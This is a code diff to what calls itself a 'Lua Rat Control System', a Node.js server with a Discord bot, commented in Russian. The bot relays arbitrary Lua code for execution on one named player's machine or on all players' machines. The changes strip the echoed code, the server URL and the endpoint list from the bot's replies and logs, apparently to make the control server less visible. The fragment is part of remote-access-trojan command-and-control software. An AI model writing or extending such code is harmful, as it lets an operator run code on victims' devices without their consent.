@@ -390,7 +390,7 @@ if (DISCORD_TOKEN) {
                     return;
                 }
                 if (await sendCommand("execute", [code], target)) {
-                    await message.reply(`🔧 Код отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}\n\`\`\`lua\n${code.substring(0, 100)}${code.length > 100 ? '...' : ''}\n\`\`\``);
+                    await message.reply(`🔧 Код отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
                 }
             },
             
@@ -490,7 +490,7 @@ if (DISCORD_TOKEN) {
                             inline: false 
                         }
                     )
-                    .setFooter({ text: `Всего команд: 28 | Сервер: ${SERVER_URL} | Версия: 3.2.0` });
+                    .setFooter({ text: 'Lua Rat System v3.2' });
                 
                 await message.reply({ embeds: [embed] });
             }
@@ -650,14 +650,12 @@ app.get('/', (req, res) => {
     res.json({
         name: "Lua Rat Control System",
         version: "3.2.0",
-        status: "operational",
-        endpoints: ["/data", "/command", "/users", "/status", "/health"]
+        status: "operational"
     });
 });
 
 app.listen(PORT, () => {
     console.log(`\nСервер запущен на ${PORT}`);
-    console.log(`URL: ${SERVER_URL}`);
     console.log(`Discord: ${DISCORD_TOKEN ? '✅' : '❌'}`);
     console.log(`Webhook: ${WEBHOOK_URL ? '✅' : '❌'}\n`);
 });
